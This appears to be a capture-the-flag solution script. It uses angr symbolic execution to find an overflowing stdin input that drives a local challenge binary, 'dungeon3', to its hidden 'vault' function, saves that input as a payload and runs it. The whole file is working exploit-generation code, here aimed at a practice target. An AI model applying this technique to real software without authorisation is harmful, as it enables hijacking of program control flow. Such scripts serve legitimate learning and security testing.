import angr
import claripy
import subprocess
def exploit_dungeon3(buffer_size, vault_addr):
    binary_path = './dungeon3'
    proj = angr.Project(binary_path, auto_load_libs=False)
    # Create a symbolic bitvector for the input
    buffer_overflow_bvv = claripy.BVS("input", buffer_size * 8)
    # Create a state at the entry point of the binary
    entry_state = proj.factory.entry_state(args=[binary_path], stdin=buffer_overflow_bvv)
    # Create a simulation manager with the entry state
    sm = proj.factory.simulation_manager(entry_state)
    # Explore the binary to try to reach the address of the vault function
    sm.explore(find=vault_addr)
    if sm.found:
        # If we found a path to the vault function, take the first one
        solution_state = sm.found[0]
        # Get the concrete input that leads to the vault function
        solution = solution_state.solver.eval(buffer_overflow_bvv, cast_to=bytes)
        # Write the solution to a payload file
        with open('payload.txt', 'wb') as f:
            f.write(solution)
        print("Generated payload.")
    else:
        print("No solution found.")
def execute_payload():
    with open("payload.txt", "rb") as f:
        subprocess.run(["./dungeon3"], input=f.read(), check=True)
if __name__ == "__main__":
    buffer_size = 40  # From manual analysis
    vault_addr = 0x0000000000400607  # From manual analysis
    exploit_dungeon3(buffer_size, vault_addr)
    execute_payload()
